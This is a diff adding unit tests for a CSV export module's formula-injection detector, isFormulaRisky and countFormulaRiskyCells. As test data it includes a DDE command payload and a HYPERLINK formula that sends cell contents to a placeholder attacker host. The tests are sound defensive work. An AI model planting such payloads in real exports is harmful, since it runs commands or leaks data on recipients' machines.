@@ -1,5 +1,11 @@
 import { describe, it, expect } from 'vitest';
-import { CSV_ROW_TERMINATOR, csvEscapeCell, csvRow } from '../../lib/utils/csv.js';
+import {
+  CSV_ROW_TERMINATOR,
+  countFormulaRiskyCells,
+  csvEscapeCell,
+  csvRow,
+  isFormulaRisky
+} from '../../lib/utils/csv.js';
 import { StreamingHandler } from '../../lib/utils/streaming-handler.js';
 import { DatabaseToolsHandler } from '../../lib/tools/handlers/database-tools.js';
 import { BaseToolHandler } from '../../lib/tools/handlers/base-handler.js';
@@ -116,6 +122,114 @@ describe('csv helpers', () => {
       ].join('\n');
 
       expect(new StreamingHandler().batchToCsv(awkward, {})).toBe(expected);
+    });
+  });
+
+  describe('isFormulaRisky', () => {
+    // The threat: a spreadsheet evaluates these as expressions on open, so a value that was
+    // only ever data in the database becomes executable in the recipient's Excel.
+    it('flags every leading character a spreadsheet evaluates', () => {
+      expect(isFormulaRisky('=1+1')).toBe(true);
+      expect(isFormulaRisky('+1')).toBe(true);
+      expect(isFormulaRisky('@SUM(A1)')).toBe(true);
+      expect(isFormulaRisky('\tcmd')).toBe(true);
+      expect(isFormulaRisky('\rcmd')).toBe(true);
+      expect(isFormulaRisky("=cmd|'/c calc'!A1")).toBe(true);
+    });
+
+    // The exemption that makes the check usable rather than noise. mssql hands back INT and
+    // DECIMAL columns as JS numbers, so every negative value in the export arrives as a string
+    // starting with `-`. Without this, a variance column fires on every row and the warning is
+    // trained out of its reader within a handful of calls.
+    it('exempts strict numeric literals, including negatives', () => {
+      expect(isFormulaRisky(-1)).toBe(false);
+      expect(isFormulaRisky('-1')).toBe(false);
+      expect(isFormulaRisky('-1.5')).toBe(false);
+      expect(isFormulaRisky('-1.5e3')).toBe(false);
+      expect(isFormulaRisky('-1E-3')).toBe(false);
+    });
+
+    // The exemption must not become an escape hatch: a formula that merely opens with digits
+    // is still a formula, and this is the boundary where a sloppy regex would let it through.
+    it('does not exempt an expression that merely starts like a number', () => {
+      expect(isFormulaRisky('-1+1')).toBe(true);
+      expect(isFormulaRisky("-1+cmd|'/c calc'!A1")).toBe(true);
+      expect(isFormulaRisky('-1 ')).toBe(true);
+      expect(isFormulaRisky('--1')).toBe(true);
+    });
+
+    it('leaves ordinary values, blanks and positive numbers alone', () => {
+      expect(isFormulaRisky('plain')).toBe(false);
+      expect(isFormulaRisky('Doe, John')).toBe(false);
+      expect(isFormulaRisky(42)).toBe(false);
+      expect(isFormulaRisky(0)).toBe(false);
+      expect(isFormulaRisky(false)).toBe(false);
+      expect(isFormulaRisky('')).toBe(false);
+      expect(isFormulaRisky(null)).toBe(false);
+      expect(isFormulaRisky(undefined)).toBe(false);
+    });
+
+    // A trigger only counts in first position - `a=b` is data, and treating it as a formula
+    // would flag a large share of ordinary text.
+    it('only looks at the first character', () => {
+      expect(isFormulaRisky('a=1+1')).toBe(false);
+      expect(isFormulaRisky('total-1')).toBe(false);
+    });
+
+    // Quoting is RFC 4180 compliance, not a mitigation: the reader strips the quotes and
+    // evaluates the field content. Pinned so nobody "fixes" this by widening MUST_QUOTE.
+    it('is orthogonal to quoting - a quoted field is still evaluated', () => {
+      expect(csvEscapeCell('=A1,B1')).toBe('"=A1,B1"');
+      expect(isFormulaRisky('=A1,B1')).toBe(true);
+
+      // And a leading tab is not even quoted today, so quoting could not have covered it.
+      expect(csvEscapeCell('\tTAB')).toBe('\tTAB');
+      expect(isFormulaRisky('\tTAB')).toBe(true);
+    });
+  });
+
+  describe('countFormulaRiskyCells', () => {
+    it('counts risky cells across every row', () => {
+      const rows = [
+        { id: 1, note: '=1+1' },
+        { id: 2, note: 'plain' },
+        { id: 3, note: '@SUM(A1)' }
+      ];
+      expect(countFormulaRiskyCells(rows)).toBe(2);
+    });
+
+    it('ignores the headers unless asked, since they are written only once', () => {
+      const rows = [{ '=total': 1 }, { '=total': 2 }];
+
+      expect(countFormulaRiskyCells(rows)).toBe(0);
+      expect(countFormulaRiskyCells(rows, true)).toBe(1);
+    });
+
+    it('returns zero for an empty or absent batch', () => {
+      expect(countFormulaRiskyCells([])).toBe(0);
+      expect(countFormulaRiskyCells(undefined)).toBe(0);
+      expect(countFormulaRiskyCells(null, true)).toBe(0);
+    });
+
+    it('does not fire on a table of ordinary negative numbers', () => {
+      const ledger = [
+        { account: 'ops', delta: -1 },
+        { account: 'rnd', delta: -1250.75 },
+        { account: 'cap', delta: 300 }
+      ];
+      expect(countFormulaRiskyCells(ledger, true)).toBe(0);
+    });
+  });
+
+  // The whole policy in one assertion: detect, never rewrite.
+  describe('the export is never modified to mitigate this', () => {
+    it('serialises a formula-shaped value byte-for-byte', () => {
+      const payload = '=HYPERLINK("http://attacker/?"&A1)';
+
+      expect(isFormulaRisky(payload)).toBe(true);
+      expect(csvEscapeCell(payload)).toBe('"=HYPERLINK(""http://attacker/?""&A1)"');
+      expect(csvEscapeCell('-1')).toBe('-1');
+      expect(csvRow(['=1+1', -1])).toBe('=1+1,-1\n');
     });
   });
 });
